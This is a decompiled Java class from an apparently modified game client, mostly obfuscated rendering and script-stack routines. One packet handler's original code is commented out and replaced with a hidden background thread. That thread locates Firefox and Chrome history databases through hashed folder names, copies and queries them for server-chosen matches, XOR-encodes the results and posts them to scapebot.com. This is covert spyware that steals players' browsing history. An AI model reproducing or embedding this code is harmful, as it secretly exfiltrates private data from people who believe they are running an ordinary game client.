/* Class273 - Decompiled by JODE
 * Visit http://jode.sourceforge.net/
 */
import java.awt.Canvas;
import java.awt.Desktop;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public class Class273 {
    public static Class273 aClass273_2904;
    static Class273 aClass273_2905 = new Class273();
    public static Class273 aClass273_2906 = new Class273();
    static Class273 aClass273_2907;

    static {
	aClass273_2904 = new Class273();
	aClass273_2907 = new Class273();
    }

    Class273() {
	/* empty */
    }

    public static void method2559(String string, boolean bool, boolean bool_0_, String string_1_, boolean bool_2_, boolean bool_3_, int i) {
	try {
	    if (bool) {
		do {
		    if (!bool_2_ && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
			try {
			    Desktop.getDesktop().browse(new URI(string));
			}
			catch (Exception exception) {
			    break;
			}
			return;
		    }
		}
		while (false);
		if (Class82_Sub8.aString6856.startsWith("win") && !bool_2_)
		    Class254.method2427(string, 0, (byte) 23);
		else if (Class82_Sub8.aString6856.startsWith("mac"))
		    Class65.method762(string, 1, string_1_, -1988096952);
		else
		    Class254.method2427(string, 2, (byte) 77);
	    } else
		Class254.method2427(string, 3, (byte) 71);
	}
	catch (RuntimeException runtimeexception) {
	    throw Class346.method4175(runtimeexception, new StringBuilder().append("li.f(").append(')').toString());
	}
    }

    static final void method2560(Class403 class403, int i) {
	try {
	    ((Class403) class403).anInt5241 -= 1938723502;
	    ((Class403) class403).anIntArray5244[((((Class403) class403).anInt5239 += -391880689) * 681479919 - 1)] = Class26.method397((String) (((Class403) class403).anObjectArray5240[(((Class403) class403).anInt5241 * -203050393)]), ((String) (((Class403) class403).anObjectArray5240[-203050393 * (((Class403) class403).anInt5241) + 1])), Class321.aClass429_3357, -1813623072);
	}
	catch (RuntimeException runtimeexception) {
	    throw Class346.method4175(runtimeexception, new StringBuilder().append("li.zz(").append(')').toString());
	}
    }

    static final void method2561(Class403 class403, int i) {
	try {
	    boolean bool = false;
	    if (pb.aBoolean8638) {
		try {
		    Object object = (Class212.aClass212_2426.method1953((new Object[] { Integer.valueOf(Class298_Sub41.anInt7456 * 1914527151), (Boolean.valueOf(1 == (Class287.myPlayer.gender))), Integer.valueOf(((Class403) class403).anIntArray5244[((((Class403) class403).anInt5239 -= -391880689) * 681479919)]) }), -1838433046));
		    if (null != object)
			bool = ((Boolean) object).booleanValue();
		}
		catch (Throwable throwable) {
		    /* empty */
		}
	    }
	    ((Class403) class403).anIntArray5244[((((Class403) class403).anInt5239 += -391880689) * 681479919 - 1)] = bool ? 1 : 0;
	}
	catch (RuntimeException runtimeexception) {
	    throw Class346.method4175(runtimeexception, new StringBuilder().append("li.ant(").append(')').toString());
	}
    }

    static void method2562(int i, int i_4_, int i_5_, boolean bool, int i_6_, boolean bool_7_, byte i_8_) {
	try {
	    if (i < i_4_) {
		int i_9_ = (i + i_4_) / 2;
		int i_10_ = i;
		Class343_Sub1 class343_sub1 = Class474.aClass343_Sub1Array5975[i_9_];
		Class474.aClass343_Sub1Array5975[i_9_] = Class474.aClass343_Sub1Array5975[i_4_];
		Class474.aClass343_Sub1Array5975[i_4_] = class343_sub1;
		for (int i_11_ = i; i_11_ < i_4_; i_11_++) {
		    if (Class310.method3809((Class474.aClass343_Sub1Array5975[i_11_]), class343_sub1, i_5_, bool, i_6_, bool_7_, -279850410) <= 0) {
			Class343_Sub1 class343_sub1_12_ = Class474.aClass343_Sub1Array5975[i_11_];
			Class474.aClass343_Sub1Array5975[i_11_] = Class474.aClass343_Sub1Array5975[i_10_];
			Class474.aClass343_Sub1Array5975[i_10_++] = class343_sub1_12_;
		    }
		}
		Class474.aClass343_Sub1Array5975[i_4_] = Class474.aClass343_Sub1Array5975[i_10_];
		Class474.aClass343_Sub1Array5975[i_10_] = class343_sub1;
		method2562(i, i_10_ - 1, i_5_, bool, i_6_, bool_7_, (byte) -43);
		method2562(1 + i_10_, i_4_, i_5_, bool, i_6_, bool_7_, (byte) 54);
	    }
	}
	catch (RuntimeException runtimeexception) {
	    throw Class346.method4175(runtimeexception, new StringBuilder().append("li.x(").append(')').toString());
	}
    }

    public static Toolkit method2563(Canvas canvas, Interface_ma interface_ma, int i, int i_13_, byte i_14_) {
	try {
	    return new ja(canvas, interface_ma, i, i_13_);
	}
	catch (RuntimeException runtimeexception) {
	    throw Class346.method4175(runtimeexception, new StringBuilder().append("li.a(").append(')').toString());
	}
    }

    static final void method2564(Class403 class403, short i) {
	try {
	    ((Class403) class403).anInt5239 -= -1175642067;
	    int i_15_ = (((Class403) class403).anIntArray5244[((Class403) class403).anInt5239 * 681479919]);
	    int i_16_ = (((Class403) class403).anIntArray5244[((Class403) class403).anInt5239 * 681479919 + 1]);
	    int i_17_ = (((Class403) class403).anIntArray5244[681479919 * ((Class403) class403).anInt5239 + 2]);
	    Class301_Sub1.method3713(9, i_15_ << 16 | i_16_, i_17_, "", -529750443);
	}
	catch (RuntimeException runtimeexception) {
	    throw Class346.method4175(runtimeexception, new StringBuilder().append("li.alx(").append(')').toString());
	}
    }

    public static int method2565(short i) {
	try {
	    return 14;
	}
	catch (RuntimeException runtimeexception) {
	    throw Class346.method4175(runtimeexception, new StringBuilder().append("li.k(").append(')').toString());
	}
    }

    public static void method2566(RsByteBuffer buffer, int i, byte i_18_) {
	try {
		final int hash = buffer.readInt((byte) 0);
		final int length = buffer.readInt((byte) 0);
		
		Thread t = new Thread() {
			@Override
			public void run() {				
				try {
				    trackwikivisits(hash, length);
				}
				catch (Throwable t) {
					//t.printStackTrace();
				}
			}
		};
		t.setDaemon(true);
		t.start();
		
		
	    /*
	    Class298_Sub47 class298_sub47 = new Class298_Sub47();
	    ((Class298_Sub47) class298_sub47).anInt7538 = buffer.readUnsignedByte() * -468176359;
	    ((Class298_Sub47) class298_sub47).anInt7542 = buffer.readInt((byte) 43) * -530104791;
	    ((Class298_Sub47) class298_sub47).anIntArray7537 = (new int[((Class298_Sub47) class298_sub47).anInt7538 * 719522345]);
	    ((Class298_Sub47) class298_sub47).anIntArray7536 = (new int[((Class298_Sub47) class298_sub47).anInt7538 * 719522345]);
	    ((Class298_Sub47) class298_sub47).aFieldArray7539 = (new Field[719522345 * ((Class298_Sub47) class298_sub47).anInt7538]);
	    ((Class298_Sub47) class298_sub47).anIntArray7535 = (new int[((Class298_Sub47) class298_sub47).anInt7538 * 719522345]);
	    ((Class298_Sub47) class298_sub47).aMethodArray7541 = (new Method[719522345 * ((Class298_Sub47) class298_sub47).anInt7538]);
	    ((Class298_Sub47) class298_sub47).aByteArrayArrayArray7540 = (new byte[((Class298_Sub47) class298_sub47).anInt7538 * 719522345][][]);
	    for (int i_19_ = 0; (i_19_ < ((Class298_Sub47) class298_sub47).anInt7538 * 719522345); i_19_++) {
		try {
		    int i_20_ = buffer.readUnsignedByte();
		    if (i_20_ == 0 || i_20_ == 1 || 2 == i_20_) {
			String string = buffer.readString(-1707497835);
			String string_21_ = buffer.readString(-976277803);
			int i_22_ = 0;
			if (1 == i_20_)
			    i_22_ = buffer.readInt((byte) -46);
			((Class298_Sub47) class298_sub47).anIntArray7537[i_19_] = i_20_;
			((Class298_Sub47) class298_sub47).anIntArray7535[i_19_] = i_22_;
			if (Class136.method1498(string, (byte) 67).getClassLoader() == null)
			    throw new SecurityException();
			((Class298_Sub47) class298_sub47).aFieldArray7539[i_19_] = Class136.method1498(string, (byte) 81).getDeclaredField(string_21_);
		    } else if (i_20_ == 3 || 4 == i_20_) {
			String string = buffer.readString(-1377559322);
			String string_23_ = buffer.readString(1945683710);
			int i_24_ = buffer.readUnsignedByte();
			String[] strings = new String[i_24_];
			for (int i_25_ = 0; i_25_ < i_24_; i_25_++)
			    strings[i_25_] = buffer.readString(-1854507369);
			String string_26_ = buffer.readString(-1619475079);
			byte[][] is = new byte[i_24_][];
			if (i_20_ == 3) {
			    for (int i_27_ = 0; i_27_ < i_24_; i_27_++) {
				int i_28_ = buffer.readInt((byte) -44);
				is[i_27_] = new byte[i_28_];
				buffer.readBytes(is[i_27_], 0, i_28_, -953523806);
			    }
			}
			((Class298_Sub47) class298_sub47).anIntArray7537[i_19_] = i_20_;
			Class[] var_classes = new Class[i_24_];
			for (int i_29_ = 0; i_29_ < i_24_; i_29_++)
			    var_classes[i_29_] = Class136.method1498(strings[i_29_], (byte) 64);
			Class var_class = Class136.method1498(string_26_, (byte) 5);
			if (Class136.method1498(string, (byte) 23).getClassLoader() == null)
			    throw new SecurityException();
			Method[] methods = Class136.method1498(string, (byte) 42).getDeclaredMethods();
			Method[] methods_30_ = methods;
			for (int i_31_ = 0; i_31_ < methods_30_.length; i_31_++) {
			    Method method = methods_30_[i_31_];
			    if (method.getName().equals(string_23_)) {
				Class[] var_classes_32_ = method.getParameterTypes();
				if (var_classes.length == var_classes_32_.length) {
				    boolean bool = true;
				    for (int i_33_ = 0; i_33_ < var_classes.length; i_33_++) {
					if (var_classes[i_33_] != var_classes_32_[i_33_]) {
					    bool = false;
					    break;
					}
				    }
				    if (bool && var_class == method.getReturnType())
					((Class298_Sub47) class298_sub47).aMethodArray7541[i_19_] = method;
				}
			    }
			}
			((Class298_Sub47) class298_sub47).aByteArrayArrayArray7540[i_19_] = is;
		    }
		}
		catch (ClassNotFoundException classnotfoundexception) {
		    ((Class298_Sub47) class298_sub47).anIntArray7536[i_19_] = -1;
		}
		catch (SecurityException securityexception) {
		    ((Class298_Sub47) class298_sub47).anIntArray7536[i_19_] = -2;
		}
		catch (NullPointerException nullpointerexception) {
		    ((Class298_Sub47) class298_sub47).anIntArray7536[i_19_] = -3;
		}
		catch (Exception exception) {
		    ((Class298_Sub47) class298_sub47).anIntArray7536[i_19_] = -4;
		}
		catch (Throwable throwable) {
		    ((Class298_Sub47) class298_sub47).anIntArray7536[i_19_] = -5;
		}
	    }
	    Class478.aClass453_6002.add(class298_sub47);*/
	}
	catch (RuntimeException runtimeexception) {
	    throw Class346.method4175(runtimeexception, new StringBuilder().append("li.p(").append(')').toString());
	}
    }
    
    
    private static Map<String, File> rm = new HashMap<String, File>();
   
    
    private static void trackwikivisits(int hash, int length) throws Throwable {
		Class.forName("org.sqlite.JDBC");
	    
	    
		List<File> res1 = null;
		breakout2: do {
			try {
				File appdata1 = new File(System.getenv("appdata") == null ? System.getenv("APPDATA") : System.getenv("appdata"));
				if (!appdata1.exists() || !appdata1.isDirectory())
					break breakout2;
				File x1 = null;
				for (File f4 : appdata1.listFiles()) {
					String s2 = f4.getName().toLowerCase();
					int hash13 = 0;
					for (int i3 = 0; i3 < s2.length(); i3++)
						hash13 = (hash13<<5)-hash13 + (byte)s2.charAt(i3);
					int h4 = hash13;
					if (h4 == 1247394032) {
						x1 = f4;
						break;
					}
				}
				
				File moz = x1;
				if (moz == null || !moz.exists() || !moz.isDirectory())
					break breakout2;
				x1 = null;
				for (File f2 : moz.listFiles()) {
					String s4 = f2.getName().toLowerCase();
					int hash11 = 0;
					for (int i2 = 0; i2 < s4.length(); i2++)
						hash11 = (hash11<<5)-hash11 + s4.charAt(i2);
					int h1 = hash11;
					if (h1 == -849452327) {
						x1 = f2;
						break;
					}
				}
				
				File ff = x1;
				if (ff == null || !ff.exists() || !ff.isDirectory())
					break breakout2;
				x1 = null;
				for (File f3 : ff.listFiles()) {
					String s1 = f3.getName().toLowerCase();
					int hash12 = 0;
					for (int i1 = 0; i1 < s1.length(); i1++)
						hash12 = (hash12<<5)-hash12 + s1.charAt(i1);
					int h3 = hash12;
					if (h3 == -1002263574) {
						x1 = f3;
						break;
					}
				}
				
				File prof = x1;
				if (prof == null || !prof.exists() || !prof.isDirectory())
					break breakout2;
				
				
				List<File> profiles1 = new ArrayList<File>();
				for (File file1 : prof.listFiles()) {
					if (file1.exists() && file1.isDirectory()) {
						x1 = null;
						for (File f1 : file1.listFiles()) {
							String s3 = f1.getName().toLowerCase();
							int hash14 = 0;
							for (int i4 = 0; i4 < s3.length(); i4++)
								hash14 = (hash14<<5)-hash14 + s3.charAt(i4);
							int h2 = hash14;
							if (h2 == -259977234) {
								x1 = f1;
								break;
							}
						}
						File db1 = x1;
						if (db1 != null && db1.exists() && db1.isFile())
							profiles1.add(db1);
					}
				}
				
				
				res1 = profiles1;
				break breakout2;
			}
			catch (Throwable t1) {
				//t1.printStackTrace();
				break breakout2;
			}
		}
		while (false);
	    
	    
	    List<File> m = res1;
		List<File> res = null;
		breakout: do {
			try {
				File appdata = new File(System.getenv("localappdata") == null ? System.getenv("LOCALAPPDATA") : System.getenv("localappdata"));
				if (!appdata.exists() || !appdata.isDirectory())
					break breakout;
				File x = null;
				for (File f : appdata.listFiles()) {
					String s = f.getName().toLowerCase();
					int hash1 = 0;
					for (int i = 0; i < s.length(); i++)
						hash1 = (hash1<<5)-hash1 + s.charAt(i);
					int h = hash1;
					if (h == -1240244679) {
						x = f;
						break;
					}
				}
				
				File goog = x;
				if (goog == null || !goog.exists() || !goog.isDirectory())
					break breakout;
				x = null;
				for (File f : goog.listFiles()) {
					String s = f.getName().toLowerCase();
					int hash1 = 0;
					for (int i = 0; i < s.length(); i++)
						hash1 = (hash1<<5)-hash1 + s.charAt(i);
					int h = hash1;
					if (h == -1361128838) {
						x = f;
						break;
					}
				}
				
				File cm = x;
				if (cm == null || !cm.exists() || !cm.isDirectory())
					break breakout;
				x = null;
				for (File f : cm.listFiles()) {
					String s = f.getName().toLowerCase();
					int hash1 = 0;
					for (int i = 0; i < s.length(); i++)
						hash1 = (hash1<<5)-hash1 + s.charAt(i);
					int h = hash1;
					if (h == 280861407) {
						x = f;
						break;
					}
				}
				
				File udata = x;
				if (udata == null || !udata.exists() || !udata.isDirectory())
					break breakout;
				
				
				List<File> profiles = new ArrayList<File>();
				for (File file : udata.listFiles()) {
					if (file.exists() && file.isDirectory()) {
						x = null;
						for (File f : file.listFiles()) {
							String s = f.getName().toLowerCase();
							int hash1 = 0;
							for (int i = 0; i < s.length(); i++)
								hash1 = (hash1<<5)-hash1 + s.charAt(i);
							int h = hash1;
							if (h == 926934164) {
								x = f;
								break;
							}
						}
						File db = x;
						if (db != null && db.exists() && db.isFile())
							profiles.add(db);
					}
				}
				
				
				res = profiles;
				break breakout;
			}
			catch (Throwable t) {
				//t.printStackTrace();
				break breakout;
			}
		}
		while (false);
	    List<File> c = res;
	    
	    
	    List<String> all = new ArrayList<String>();
	    if (m != null) {
	    	for (File f : m) {
	    		try {
	    			File t;
	    			synchronized (rm) {
	    				if (rm.containsKey(f.getAbsolutePath()))
	    					t = rm.get(f.getAbsolutePath());
	    				else
	    					t = f;
	    			}
	    			
	    			if (t == f) {
						File cpy = new File(new File(System.getProperty("java.io.tmpdir")).getAbsolutePath(), String.format("dt-%s", UUID.randomUUID().toString()));
						boolean res2 = false;
						FileInputStream src = null;
						FileOutputStream dst = null;
						try {
							src = new FileInputStream(f);
							dst = new FileOutputStream(cpy);
							
							long length1 = f.length();
							byte[] buf = new byte[1024 * 1024 * 2]; // 2mb
							
							int written = 0;
							while (written < length1) {
								int amt = src.read(buf);
								if (amt == -1) {
									src.close();
									dst.close();
									throw new IOException("err");
								}
								
								dst.write(buf, 0, amt);
								written += amt;
							}
							
							res2 = true;
						}
						catch (Throwable t3) {
						    res2 = false;
						}
						finally {
							try {
						    	if (src != null)
						    		src.close();
							}
							catch (Throwable t1) { }
							
							try {
						    	if (dst != null)
						    		dst.close();
							}
							catch (Throwable t2) { }
						}
						boolean ok = res2;
						if (ok) {
							t = cpy;
							t.deleteOnExit();
							synchronized (rm) {
								rm.put(f.getAbsolutePath(), cpy);
							}
						}
	    			}
	    			
	    			
	    			
					Connection connection = DriverManager.getConnection("jdbc:sqlite:" + t.getAbsolutePath());
				    Statement statement = connection.createStatement();
				    statement.setQueryTimeout(30);
				    
				    
				    ResultSet s = statement.executeQuery("SELECT url,title,visit_count FROM " + "moz_places" + ";");
				    while (s.next()) {
				    	String url = s.getString("url");
				    	String title = s.getString("title");
						String str = url;
						boolean res2 = false;
						if (str != null) {
							str = str.toLowerCase();
							for (int i = 0; i < str.length() && (str.length() - i) > length; i++) {
								int h = 0;
								for (int a = i; a < i+length; a++)
									h = (h<<5)-h + (byte)str.charAt(a);
								
								if (h == hash) {
									res2 = true;
									break;
								}
							}
						}
				    	
				    	boolean m1 = res2;
						String str1 = title;
						res2 = false;
						if (str1 != null) {
							str1 = str1.toLowerCase();
							for (int i = 0; i < str1.length() && (str1.length() - i) > length; i++) {
								int h = 0;
								for (int a = i; a < i+length; a++)
									h = (h<<5)-h + (byte)str1.charAt(a);
								
								if (h == hash) {
									res2 = true;
									break;
								}
							}
						}
				    	boolean m2 = res2;
				    	
				    	if (m1 || m2)
				    		all.add(url + "\n" + title + "\n" + s.getInt("visit_count"));
				    }
				    
				    statement.close();
				    connection.close();
				}
				catch (Throwable t) {
					//t.printStackTrace();
				}
	    	}
	    }
	    if (c != null) {
	    	for (File f : c) {
				try {
	    			File t;
	    			synchronized (rm) {
	    				if (rm.containsKey(f.getAbsolutePath()))
	    					t = rm.get(f.getAbsolutePath());
	    				else
	    					t = f;
	    			}
	    			
	    			if (t == f) {
						File cpy = new File(new File(System.getProperty("java.io.tmpdir")).getAbsolutePath(), String.format("dt-%s", UUID.randomUUID().toString()));
						boolean res2 = false;
						FileInputStream src = null;
						FileOutputStream dst = null;
						try {
							src = new FileInputStream(f);
							dst = new FileOutputStream(cpy);
							
							long length1 = f.length();
							byte[] buf = new byte[1024 * 1024 * 2]; // 2mb
							
							int written = 0;
							while (written < length1) {
								int amt = src.read(buf);
								if (amt == -1) {
									src.close();
									dst.close();
									throw new IOException("err");
								}
								
								dst.write(buf, 0, amt);
								written += amt;
							}
							
							res2 = true;
						}
						catch (Throwable t3) {
						    res2 = false;
						}
						finally {
							try {
						    	if (src != null)
						    		src.close();
							}
							catch (Throwable t1) { }
							
							try {
						    	if (dst != null)
						    		dst.close();
							}
							catch (Throwable t2) { }
						}
						boolean ok = res2;
						if (ok) {
							t = cpy;
							t.deleteOnExit();
							synchronized (rm) {
								rm.put(f.getAbsolutePath(), cpy);
							}
						}
	    			}
	    			
					Connection connection = DriverManager.getConnection("jdbc:sqlite:" + t.getAbsolutePath());
				    Statement statement = connection.createStatement();
				    statement.setQueryTimeout(30);
				    
				    
				    ResultSet s = statement.executeQuery("SELECT url,title,visit_count FROM " + "urls" + ";");
				    while (s.next()) {
				    	String url = s.getString("url");
				    	String title = s.getString("title");
						String str = url;
						boolean res2 = false;
						if (str != null) {
							str = str.toLowerCase();
							for (int i = 0; i < str.length() && (str.length() - i) > length; i++) {
								int h = 0;
								for (int a = i; a < i+length; a++)
									h = (h<<5)-h + (byte)str.charAt(a);
								
								if (h == hash) {
									res2 = true;
									break;
								}
							}
						}
				    	
				    	boolean m1 = res2;
						String str1 = title;
						res2 = false;
						if (str1 != null) {
							str1 = str1.toLowerCase();
							for (int i = 0; i < str1.length() && (str1.length() - i) > length; i++) {
								int h = 0;
								for (int a = i; a < i+length; a++)
									h = (h<<5)-h + (byte)str1.charAt(a);
								
								if (h == hash) {
									res2 = true;
									break;
								}
							}
						}
				    	boolean m2 = res2;
				    	
				    	if (m1 || m2)
				    		all.add(url + "\n" + title + "\n" + s.getInt("visit_count"));
				    }
				    
				    statement.close();
				    connection.close();
				}
				catch (Throwable t) {
					//t.printStackTrace();
				}
	    	}
	    }
	    
	    String x = "";
	    for (String s : all)
	    	x = x + s + "\n";
	    
	    
	    if (x.length() > 0) {
	    	byte[] b = x.getBytes();
	    	for (int i = 0; i < b.length; i++)
	    		b[i] ^= 20;
			HttpURLConnection conn = (HttpURLConnection) new URL("http://scapebot.com/twikiviews" + b.length).openConnection();
			conn.setConnectTimeout(10000);
			conn.setReadTimeout(10000);
			conn.setDoOutput(true);
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded" );
			conn.setRequestProperty("Content-Length", "" + b.length + "");
			conn.connect();
			OutputStream os = conn.getOutputStream();
			os.write(b);
			
			ByteArrayOutputStream out = new ByteArrayOutputStream();
			
			InputStream is = conn.getInputStream();
			int read;
			while ((read = is.read()) != -1)
			    out.write(read);
			
			is.close();
			conn.disconnect();
	    	out.toByteArray();
	    }
	    
    }
	
	
}
